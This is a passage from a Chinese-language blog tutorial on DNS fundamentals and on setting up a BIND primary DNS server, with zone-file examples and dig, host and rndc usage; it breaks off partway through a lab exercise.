alt="img"></a></p><blockquote><ul><li>递归查询</li></ul><p><strong>是指DNS服务器在收到用户发起的请求时，必须向用户返回一个准确的查询结果。如果DNS服务器本地没有存储与之对应的信息，则该服务器需要询问其他服务器，并将返回的查询结构提交给用户。</strong></p><p>一般客户机和本地DNS服务器之间属于递归查询，即当客户机向DNS服务器发出请求后,若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到最终的肯定或否定的结果后转交给客户机。此查询的源和目标保持不变,为了查询结果只需要发起一次查询</p><p>递归算法：客户端向LocalDNS发起域名查询–&gt;localDNS不知道域名对应的IP–&gt;但它知道谁知道-&gt;他代为帮客户端去查找–&gt;最后再返回最终结果</p><ul><li>迭代查询</li></ul><p><strong>是指DNS服务器在收到用户发起的请求时，并不直接回复查询结果，而是告诉另一台DNS服务器的地址，用户再向这台DNS服务器提交请求，这样依次反复，直到返回查询结果。</strong></p><p>一般情况下(有例外)本地的DNS服务器向其它DNS服务器的查询属于迭代查询,如：若对方不能返回权威的结果，则它会向下一个DNS服务器(参考前一个DNS服务器返回的结果)再次发起进行查询，直到返回查询的结果为止。此查询的源不变,但查询的目标不断变化,为查询结果一般需要发起多次查询</p><p>迭代算法︰客户端向LocalDNS发起域名查询–&gt;localDNS不知道域名对应的IP–&gt;但它知道谁知道并推荐客户端应该找谁–&gt;客户端自己去找它</p><ul><li>DNS缓存:</li></ul><p>DNS缓存是将解析数据存储在靠近发起请求的客户端的位置，也可以说DNS数据是可以缓存在任意位置，最终目的是以此减少递归查询过程，可以更快的让用户获得请求结果。</p></blockquote><hr><h3 id="1-3-解析类型"><a href="#1-3-解析类型" class="headerlink" title="1.3 解析类型"></a>1.3 解析类型</h3><blockquote><ul><li>FQDN –&gt; IP 正向解析</li><li>IP –&gt; FQDN 反向解析</li></ul><p>FQDN（全称域名）</p><p>注意：正反向解析是两个不同的名称空间，是两棵不同的解析树</p></blockquote><hr><h3 id="1-4-完整的查询请求经过的流程"><a href="#1-4-完整的查询请求经过的流程" class="headerlink" title="1.4 完整的查询请求经过的流程"></a>1.4 完整的查询请求经过的流程</h3><blockquote><p>Client –&gt;hosts文件 –&gt; Client DNS Service Local Cache –&gt; DNS Server (recursion递归) –&gt; DNS Server Cache –&gt;DNS iteration(迭代) –&gt; 根–&gt; 顶级域名DNS–&gt;二级域名DNS…</p></blockquote><hr><h3 id="范例-Windows-客户端DNS缓存"><a href="#范例-Windows-客户端DNS缓存" class="headerlink" title="范例: Windows 客户端DNS缓存"></a>范例: Windows 客户端DNS缓存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Administrator&gt;ipconfig/displaydns | findstr  redhat<br>C:\Users\Administrator&gt;ping www.redhat.com<br>正在 Ping e3396.ca2.s.tl88.net [117.177.243.181] 具有 32 字节的数据:<br>来自 117.177.243.181 的回复: 字节=32 时间=29ms TTL=53<br>来自 117.177.243.181 的回复: 字节=32 时间=30ms TTL=53<br>来自 117.177.243.181 的回复: 字节=32 时间=29ms TTL=53<br>来自 117.177.243.181 的回复: 字节=32 时间=31ms TTL=53<br>117.177.243.181 的 Ping 统计信息:<br>    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，<br>往返行程的估计时间(以毫秒为单位):<br>    最短 = 29ms，最长 = 31ms，平均 = 29ms<br>C:\Users\Administrator&gt;ipconfig/displaydns | findstr  redhat<br>    www.redhat.com<br>    记录名称. . . . . . . : www.redhat.com<br>    CNAME 记录  . . . . . : ds-www.redhat.com.edgekey.net<br>    记录名称. . . . . . . : ds-www.redhat.com.edgekey.net<br>    CNAME 记录  . . . . . : ds-www.redhat.com.edgekey.net.globalredir.akadns.net<br>    记录名称. . . . . . . : ds-www.redhat.com.edgekey.net.globalredir.akadns.net<br>C:\Users\Administrator&gt;ipconfig/flushdns<br>Windows IP 配置<br>已成功刷新 DNS 解析缓存。<br>C:\Users\Administrator&gt;ipconfig/displaydns | findstr  redhat<br>C:\Users\Administrator&gt;<br></code></pre></td></tr></table></figure><hr><h2 id="2-DNS-服务相关概念和技术"><a href="#2-DNS-服务相关概念和技术" class="headerlink" title="2 DNS 服务相关概念和技术"></a>2 DNS 服务相关概念和技术</h2><h3 id="2-1-DNS服务器的类型"><a href="#2-1-DNS服务器的类型" class="headerlink" title="2.1 DNS服务器的类型"></a>2.1 DNS服务器的类型</h3><blockquote><ul><li>主DNS服务器</li><li>从DNS服务器</li><li>缓存DNS服务器（转发器）</li></ul></blockquote><h4 id="2-1-1-主DNS服务器"><a href="#2-1-1-主DNS服务器" class="headerlink" title="2.1.1 主DNS服务器"></a>2.1.1 主DNS服务器</h4><blockquote><p>管理和维护所负责解析的域内解析库的服务器</p></blockquote><h4 id="2-1-2-从DNS服务器"><a href="#2-1-2-从DNS服务器" class="headerlink" title="2.1.2 从DNS服务器"></a>2.1.2 从DNS服务器</h4><blockquote><p>从主服务器或从服务器”复制”（区域传输）解析库副本</p><ul><li><strong>序列号</strong>：解析库版本号，主服务器解析库变化时，其序列递增</li><li><strong>刷新时间间隔</strong>：从服务器从主服务器请求同步解析的时间间隔</li><li><strong>重试时间间隔</strong>：从服务器请求同步失败时，再次尝试时间间隔</li><li><strong>过期时长</strong>：从服务器联系不到主服务器时，多久后停止服务</li><li><strong>通知机制</strong>：主服务器解析库发生变化时，会主动通知从服务器</li></ul></blockquote><hr><h3 id="2-2-各种资源记录"><a href="#2-2-各种资源记录" class="headerlink" title="2.2 各种资源记录"></a>2.2 各种资源记录</h3><blockquote><p>区域解析库：由众多<strong>资源记录RR</strong>(Resource Record)组成</p><p><strong>记录类型：A, AAAA, PTR, SOA, NS, CNAME, MX</strong></p><ul><li><strong>SOA</strong>：Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，必须位于解析库的第一条记录</li><li><strong>A</strong>：internet Address，作用，FQDN –&gt; IP</li><li><strong>AAAA</strong>：FQDN（全程域名） –&gt; IPv6</li><li><strong>PTR</strong>：PoinTeR，IP –&gt; FQDN</li><li><strong>NS</strong>：Name Server，专用于标明当前区域的DNS服务器</li><li><strong>CNAME</strong> ： Canonical Name，别名记录</li><li><strong>MX</strong>：Mail eXchanger，邮件交换器</li><li>TXT：对域名进行标识和说明的一种方式，一般做验证记录时会使用此项，如：SPF（反垃圾邮件）记录，https验证等，如下示例：</li></ul></blockquote><h4 id="2-2-1-资源记录定义"><a href="#2-2-1-资源记录定义" class="headerlink" title="2.2.1 资源记录定义"></a>2.2.1 资源记录定义</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">name [TTL] IN rr_type value<br></code></pre></td></tr></table></figure><blockquote><p>注意：</p><ol><li><strong>TTL可从全局继承</strong></li><li><strong>使用 “@” 符号可用于引用当前区域的域名</strong></li><li><strong>同一个名字可以通过多条记录定义多个不同的值；此时DNS服务器会以轮询方式响应</strong></li><li>同一个值也可能有多个不同的定义名字；通过多个不同的名字指向同一个值进行定义；此仅表示通过多个不同的名字可以找到同一个主机</li></ol></blockquote><h4 id="2-2-2-SOA记录"><a href="#2-2-2-SOA记录" class="headerlink" title="2.2.2 SOA记录"></a>2.2.2 SOA记录</h4><blockquote><p>name: 当前区域的名字，例如”willoneday.org.”</p><p>value: 有多部分组成</p><p>注意：</p><ol><li>当前区域的主DNS服务器的FQDN，也可以使用当前区域的名字，只是注释功能，可以不需要配置对应的NS记录和A记录</li><li>当前区域管理员的邮箱地址；<strong>但地址中不能使用@符号，一般用.替换</strong>，例如：willoneday.qq.com</li><li>主从服务区域传输相关定义以及否定的答案的统一的TTL</li></ol></blockquote><h5 id="范例：写法"><a href="#范例：写法" class="headerlink" title="范例：写法"></a>范例：写法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">willoneday.org. 86400 IN SOA ns.willoneday.org. nsadmin.willoneday.org. (<br> 2022       ;序列号<br> 2H         ;刷新时间<br> 10M        ;重试时间<br> 1W         ;过期时间<br> 1D         ;否定答案的TTL值<br>)<br></code></pre></td></tr></table></figure><h4 id="2-2-3-NS记录"><a href="#2-2-3-NS记录" class="headerlink" title="2.2.3 NS记录"></a>2.2.3 NS记录</h4><blockquote><p>name: 当前区域的名字</p><p>value: 当前区域的某DNS服务器的名字，例如: ns.willoneday.org.</p><p>注意：</p><ol><li>相邻的两个资源记录的name相同时，后续的可省略</li><li><strong>对NS记录而言，任何一个ns记录后面的服务器名字，都应该在后续有一个A记录</strong></li><li>一个区域可以有多个NS记录</li></ol></blockquote><h5 id="范例：写法-1"><a href="#范例：写法-1" class="headerlink" title="范例：写法"></a>范例：写法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">willoneday.org. IN NS ns1.willoneday.org.<br>willoneday.org. IN NS ns2.willoneday.org.<br></code></pre></td></tr></table></figure><h4 id="2-2-4-MX记录"><a href="#2-2-4-MX记录" class="headerlink" title="2.2.4 MX记录"></a>2.2.4 MX记录</h4><blockquote><p>name: 当前区域的名字</p><p>value: 当前区域的某邮件服务器(smtp服务器)的主机名</p><p>注意：</p><ol><li><p>一个区域内，MX记录可有多个；但<strong>每个记录的value之前应该有一个数字(0-99)，表示此服务器的优先级；数字越小优先级越高</strong></p></li><li><p><strong>对MX记录而言，任何一个MX记录后面的服务器名字，都应该在后续有一个A记录</strong></p></li></ol></blockquote><p>范例：写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">willoneday.org. IN MX 10 mx1.willoneday.org.<br>                IN MX 20 mx2.willoneday.org.<br>mx1 A   10.0.0.100<br>mx2 A   10.0.0.200<br></code></pre></td></tr></table></figure><h4 id="2-2-5-A记录"><a href="#2-2-5-A记录" class="headerlink" title="2.2.5 A记录"></a>2.2.5 A记录</h4><blockquote><p>name: 某主机的FQDN，例如：<a href="http://www.willoneday.org/">www.willoneday.org</a>.</p><p>value: 主机名对应主机的IP地址</p><p>避免用户写错名称时给错误答案，可通过泛域名解析进行解析至某特定地址</p></blockquote><h5 id="范例：写法-2"><a href="#范例：写法-2" class="headerlink" title="范例：写法"></a>范例：写法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.willoneday.org. IN    A 1.1.1.1<br>www.willoneday.org. IN    A 2.2.2.2<br>mx1.willoneday.org. IN    A 3.3.3.3<br>mx2.willoneday.org. IN    A 4.4.4.4<br><span class="hljs-variable">$GENERATE</span> 1-254 HOST$  IN A 1.2.3.$<br>*.willoneday.org.   IN    A 5.5.5.5<br>willoneday.org.     IN    A 6.6.6.6<br><span class="hljs-comment">#注意：如果有和DNS的IP相同的多个同名的A记录，优先返回DNS的本机IP</span><br></code></pre></td></tr></table></figure><h5 id="范例：阿里云"><a href="#范例：阿里云" class="headerlink" title="范例：阿里云"></a>范例：阿里云</h5><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021002436602-1665333347.png"><img src="2927659-20221021002436602-1665333347.png" alt="img"></a></p><h4 id="2-2-6-AAAA记录"><a href="#2-2-6-AAAA记录" class="headerlink" title="2.2 6 AAAA记录"></a>2.2 6 AAAA记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">name: FQDN<br>value: IPv6<br></code></pre></td></tr></table></figure><h4 id="2-2-7-PTR记录"><a href="#2-2-7-PTR记录" class="headerlink" title="2.2.7 PTR记录"></a>2.2.7 PTR记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">name: IP，有特定格式，把IP地址反过来写，1.2.3.4，要写作4.3.2.1；而有特定后缀：inaddr.arpa.，所以完整写法为：4.3.2.1.in-addr.arpa.<br>value: FQDN<br><br><span class="hljs-comment">#注意：网络地址及后缀可省略；主机地址依然需要反着写</span><br><span class="hljs-comment">#例如：</span><br>4.3.2.1.in-addr.arpa. IN PTR www.willoneday.org.<br><span class="hljs-comment">#如1.2.3为网络地址，可简写成：</span><br>4 IN PTR www.willoneday.org.<br></code></pre></td></tr></table></figure><h4 id="2-2-8-CNAME别名记录"><a href="#2-2-8-CNAME别名记录" class="headerlink" title="2.2.8 CNAME别名记录"></a>2.2.8 CNAME别名记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">name: 别名的FQDN<br>value: 真正名字的FQDN<br><br><span class="hljs-comment">#例如</span><br>www.willoneday.org. IN CNAME   websrv.willoneday.org.<br></code></pre></td></tr></table></figure><hr><h3 id="2-3-子域授权"><a href="#2-3-子域授权" class="headerlink" title="2.3 子域授权"></a>2.3 子域授权</h3><p>每个域的名称服务器，都是通过其上级名称服务器在解析库进行授权,类似根域授权tld</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">.com. IN NS ns1.com.<br>.com. IN NS ns2.com.<br>ns1.com. IN A 2.2.2.1<br>ns2.com. IN A 2.2.2.2<br><span class="hljs-comment">#willoneday.org. 在.com的名称服务器上，解析库中添加资源记录</span><br>willoneday.org. IN NS ns1.willoneday.org.<br>willoneday.org. IN NS ns2.willoneday.org.<br>willoneday.org. IN NS ns3.willoneday.org.<br>ns1.willoneday.org. IN A 3.3.3.1<br>ns2.willoneday.org. IN A 3.3.3.2<br>ns3.willoneday.org. IN A 3.3.3.3<br></code></pre></td></tr></table></figure><hr><h3 id="2-4-whois"><a href="#2-4-whois" class="headerlink" title="2.4 whois"></a>2.4 whois</h3><h4 id="范例-whois-查询域名信息"><a href="#范例-whois-查询域名信息" class="headerlink" title="范例: whois 查询域名信息"></a>范例: whois 查询域名信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># yum install -y whois</span><br>[root@rocky01 ~]<span class="hljs-comment"># whois aliyun.com</span><br>   Domain Name: ALIYUN.COM<br>   Registry Domain ID: 1244776076_DOMAIN_COM-VRSN<br>   Registrar WHOIS Server: grs-whois.hichina.com<br>   Registrar URL: http://www.net.cn<br>   Updated Date: 2022-05-18T16:36:00Z<br>   Creation Date: 2007-09-28T11:09:56Z<br>   Registry Expiry Date: 2023-09-28T11:09:56Z<br>   Registrar: Alibaba Cloud Computing (Beijing) Co., Ltd.<br>   Registrar IANA ID: 420<br>   Registrar Abuse Contact Email: DomainAbuse@service.aliyun.com<br>   Registrar Abuse Contact Phone: +86.95187<br>   Domain Status: clientTransferProhibited https://icann.org/epp<span class="hljs-comment">#clientTransferProhibited</span><br>   Domain Status: serverDeleteProhibited https://icann.org/epp<span class="hljs-comment">#serverDeleteProhibited</span><br>   Domain Status: serverTransferProhibited https://icann.org/epp<span class="hljs-comment">#serverTransferProhibited</span><br>   Domain Status: serverUpdateProhibited https://icann.org/epp<span class="hljs-comment">#serverUpdateProhibited</span><br>   Name Server: NS3.ALIYUN.COM<br>   Name Server: NS4.ALIYUN.COM<br>   Name Server: NS5.ALIYUN.COM<br>   DNSSEC: unsigned<br>   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/<br>&gt;&gt;&gt; Last update of whois database: 2022-10-20T16:50:33Z &lt;&lt;&lt;<br>...省略...<br></code></pre></td></tr></table></figure><hr><h2 id="3-DNS软件-bind"><a href="#3-DNS软件-bind" class="headerlink" title="3 DNS软件 bind"></a>3 DNS软件 bind</h2><p>DNS服务器软件：bind，powerdns，dnsmasq，unbound，coredns</p><h3 id="3-1-bind-相关程序包"><a href="#3-1-bind-相关程序包" class="headerlink" title="3.1 bind 相关程序包"></a>3.1 bind 相关程序包</h3><blockquote><ul><li><strong>bind：服务器</strong></li><li><strong>bind-utils: 客户端</strong></li><li>bind-libs：相关库,依赖关系自动安装</li><li>bind-chroot: 安全包，将dns相关文件放至 /var/named/chroot/</li></ul></blockquote><h4 id="范例：安装bind软件"><a href="#范例：安装bind软件" class="headerlink" title="范例：安装bind软件"></a>范例：安装bind软件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># dnf -y install bind bind-utils</span><br>[root@ubuntu2004 ~]<span class="hljs-comment"># apt -y install bind9 bind9-utils</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-2-BIND包相关文件"><a href="#3-2-BIND包相关文件" class="headerlink" title="3.2 BIND包相关文件"></a>3.2 BIND包相关文件</h3><blockquote><ul><li>BIND主程序：/usr/sbin/named</li><li>服务脚本和Unit名称：/etc/rc.d/init.d/named，/usr/lib/systemd/system/named.service</li><li><strong>主配置文件：</strong><strong>/etc/named.conf, /etc/named.rfc1912.zones</strong>, /etc/rndc.key</li><li>管理工具：/usr/sbin/rndc：remote name domain controller，默认与bind安装在同一主机，且只能通过127.0.0.1连接named进程，提供辅助性的管理功能；953/tcp</li><li><strong>解析库文件：/var/named/ZONE_NAME.ZONE</strong></li></ul><p>注意：</p><p>(1) 一台物理服务器可同时为多个区域提供解析</p><p>(2) 必须要有根区域文件；named.ca</p><p>(3) 应该有两个（如果包括ipv6的，应该更多）实现localhost和本地回环地址的解析库</p></blockquote><hr><h3 id="3-3-主配置文件"><a href="#3-3-主配置文件" class="headerlink" title="3.3 主配置文件"></a>3.3 主配置文件</h3><blockquote><ul><li>全局配置：options { };</li><li>日志子系统配置：logging { };</li><li>区域定义：本机能够为哪些zone进行解析，就要定义哪些zone</li></ul><p><strong>zone “ZONE_NAME” IN { };</strong></p><p>注意：</p><ul><li>任何服务程序如果期望其能够通过网络被其它主机访问，至少应该监听在一个能与外部主机通信的IP地址上</li><li>缓存名称服务器的配置：监听外部地址即可</li><li>dnssec: 建议关闭dnssec，设为no</li></ul></blockquote><hr><h2 id="4-实现主DNS服务器"><a href="#4-实现主DNS服务器" class="headerlink" title="4 实现主DNS服务器"></a>4 实现主DNS服务器</h2><h3 id="4-1-主DNS服务器配置"><a href="#4-1-主DNS服务器配置" class="headerlink" title="4.1 主DNS服务器配置"></a>4.1 主DNS服务器配置</h3><h4 id="（1）在主配置文件中定义区域"><a href="#（1）在主配置文件中定义区域" class="headerlink" title="（1）在主配置文件中定义区域"></a>（1）在主配置文件中定义区域</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/named.conf             <br><span class="hljs-comment">#注释掉下面两行</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br>zone <span class="hljs-string">&quot;ZONE_NAME&quot;</span> IN &#123;<br>   <span class="hljs-built_in">type</span> &#123;master|slave|hint|forward&#125;;<br>   file <span class="hljs-string">&quot;ZONE_NAME.zone&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="（2）定义区域解析库文件"><a href="#（2）定义区域解析库文件" class="headerlink" title="（2）定义区域解析库文件"></a>（2）定义区域解析库文件</h4><h5 id="范例：区域数据库文件"><a href="#范例：区域数据库文件" class="headerlink" title="范例：区域数据库文件"></a>范例：区域数据库文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky8 named]<span class="hljs-comment"># cat willoneday.org.zone</span><br><span class="hljs-variable">$TTL</span> 1D<br>@           IN  SOA master.willoneday.org. admin.willoneday.org ( 20220117 3H 10M 1D 6H  )<br>                NS  master.willoneday.org.<br>master.willoneday.org.   A   10.0.0.8<br>www                      A   10.0.0.18<br>db                       A   10.0.0.200<br>node1                    A   1.1.1.1<br></code></pre></td></tr></table></figure><hr><h3 id="4-2-主配置文件语法检查"><a href="#4-2-主配置文件语法检查" class="headerlink" title="4.2 主配置文件语法检查"></a>4.2 主配置文件语法检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># named-checkconf</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-3-解析库文件语法检查"><a href="#4-3-解析库文件语法检查" class="headerlink" title="4.3 解析库文件语法检查"></a>4.3 解析库文件语法检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># named-checkzone willoneday.org /var/named/willoneday.org.zone</span><br>zone willoneday.org/IN: loaded serial 0<br>OK<br></code></pre></td></tr></table></figure><hr><h3 id="4-4-配置生效"><a href="#4-4-配置生效" class="headerlink" title="4.4 配置生效"></a>4.4 配置生效</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#三种方式</span><br>[root@rocky01 ~]<span class="hljs-comment"># rndc reload </span><br>[root@rocky01 ~]<span class="hljs-comment"># #systemctl reload named</span><br>[root@rocky01 ~]<span class="hljs-comment"># service named reload</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-5-DNS-测试和管理工具"><a href="#4-5-DNS-测试和管理工具" class="headerlink" title="4.5 DNS 测试和管理工具"></a>4.5 DNS 测试和管理工具</h3><h4 id="4-5-1-dig-命令"><a href="#4-5-1-dig-命令" class="headerlink" title="4.5.1 dig 命令"></a>4.5.1 dig 命令</h4><p>dig只用于测试dns系统，不会查询hosts文件进行解析</p><p>命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig [-t <span class="hljs-built_in">type</span>] name [@SERVER] [query options]<br>query options：<br> +[no]trace：跟踪解析过程 : dig +trace willoneday.org<br> +[no]recurse：进行递归解析<br></code></pre></td></tr></table></figure><h5 id="范例：使用方法-1"><a href="#范例：使用方法-1" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#测试反向解析</span><br>dig -x IP = dig –t ptr reverseip.in-addr.arpa<br><span class="hljs-comment">#模拟区域传送</span><br>dig -t axfr ZONE_NAME @SERVER<br>dig -t axfr willoneday.org @10.10.10.11<br>dig –t axfr 100.1.10.in-addr.arpa @172.16.1.1<br>dig -t NS . @114.114.114.114<br>dig -t NS . @a.root-servers.net<br></code></pre></td></tr></table></figure><h4 id="4-5-2-host命令"><a href="#4-5-2-host命令" class="headerlink" title="4.5.2 host命令"></a>4.5.2 host命令</h4><p>命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">host [-t <span class="hljs-built_in">type</span>] name [SERVER]<br></code></pre></td></tr></table></figure><h5 id="范例：使用方法-2"><a href="#范例：使用方法-2" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">host -t NS willoneday.org 172.16.0.1<br>host -t soa willoneday.org<br>host -t mx willoneday.org<br>host -t axfr willoneday.org<br>host 1.2.3.4<br></code></pre></td></tr></table></figure><h4 id="4-5-3-nslookup命令"><a href="#4-5-3-nslookup命令" class="headerlink" title="4.5.3 nslookup命令"></a>4.5.3 nslookup命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup [-option] [name | -] [server]<br></code></pre></td></tr></table></figure><h4 id="4-5-4-rndc-命令"><a href="#4-5-4-rndc-命令" class="headerlink" title="4.5.4 rndc 命令"></a>4.5.4 rndc 命令</h4><p>利用rndc工具可以实现管理DNS功能</p><p>rndc 监听端口: 953/tcp</p><blockquote><p>命令格式:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">rndc <span class="hljs-keyword">COMMAND</span><br></code></pre></td></tr></table></figure><p>COMMAND:</p><ul><li>status: 查看状态</li><li><strong>reload: 重载主配置文件和区域解析库文件</strong></li><li>reload zonename: 重载区域解析库文件</li><li>retransfer zonename: 手动启动区域传送，而不管序列号是否增加</li><li>notify zonename: 重新对区域传送发通知</li><li>reconfig: 重载主配置文件</li><li>querylog: 开启或关闭查询日志文件/var/log/message</li><li>trace: 递增debug一个级别</li><li>trace LEVEL: 指定使用的级别</li><li>notrace：将调试级别设置为 0</li><li><strong>flush：清空DNS服务器的所有缓存记录</strong></li></ul></blockquote><hr><h3 id="4-6-实战案例：实现DNS正向主服务器"><a href="#4-6-实战案例：实现DNS正向主服务器" class="headerlink" title="4.6 实战案例：实现DNS正向主服务器"></a>4.6 实战案例：实现DNS正向主服务器</h3><blockquote><p><strong>实验目的</strong></p><ul><li>搭建DNS正向主服务器，实现web服务器基于FQDN的访问</li></ul><p><strong>环境要求</strong></p><ul><li>需要三台主机</li><li>DNS服务端：10.0.0.101</li><li>web服务器：10.0.0.102</li><li>DNS客户端：10.0.0.103</li></ul><p><strong>前提准备</strong></p><ul><li>关闭SELinux</li><li>关闭防火墙</li><li>时间同步</li></ul></blockquote><h4 id="（1）在DNS服务端安装bind"><a href="#（1）在DNS服务端安装bind" class="headerlink" title="（1）在DNS服务端安装bind"></a>（1）在DNS服务端安装bind</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install <span class="hljs-built_in">bind</span> bind-utils -y<br></code></pre></td></tr></table></figure><h4 id="（2）修改bind-配置文件"><a href="#（2）修改bind-配置文件" class="headerlink" title="（2）修改bind 配置文件"></a>（2）修改bind 配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@101 ~]<span class="hljs-comment"># vim /etc/named.conf             </span><br><span class="hljs-comment">#注释掉下面两行</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br><br>[root@101 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones    </span><br><span class="hljs-comment">#加上下面内容</span><br>zone <span class="hljs-string">&quot;willoneday.org&quot;</span> IN &#123;<br>        <span class="hljs-built_in">type</span> master;<br>        file <span class="hljs-string">&quot;willoneday.org.zone&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="（3）DNS区域数据库文件"><a href="#（3）DNS区域数据库文件" class="headerlink" title="（3）DNS区域数据库文件"></a>（3）DNS区域数据库文件</h4><figure class="highlight 